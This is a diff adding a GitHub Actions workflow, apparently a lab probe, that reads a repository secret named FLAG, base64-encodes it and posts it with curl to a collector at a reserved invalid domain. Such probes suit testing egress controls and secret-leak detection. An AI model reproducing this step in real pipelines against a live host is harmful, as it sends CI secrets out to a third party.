@@ -1,0 +1,24 @@
+name: Hold probe 17 - FLAG encoded egress
+
+on:
+  push:
+    branches:
+      - case-17-flag-encoded-egress
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Encode FLAG and attempt transfer to a reserved invalid domain
+        env:
+          FLAG: ${{ secrets.FLAG }}
+        run: |
+          printf '%s' "$FLAG" \
+            | base64 \
+            | curl --fail --max-time 3 --data-binary @- \
+                https://encoded-flag-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=flag-encoded-egress'
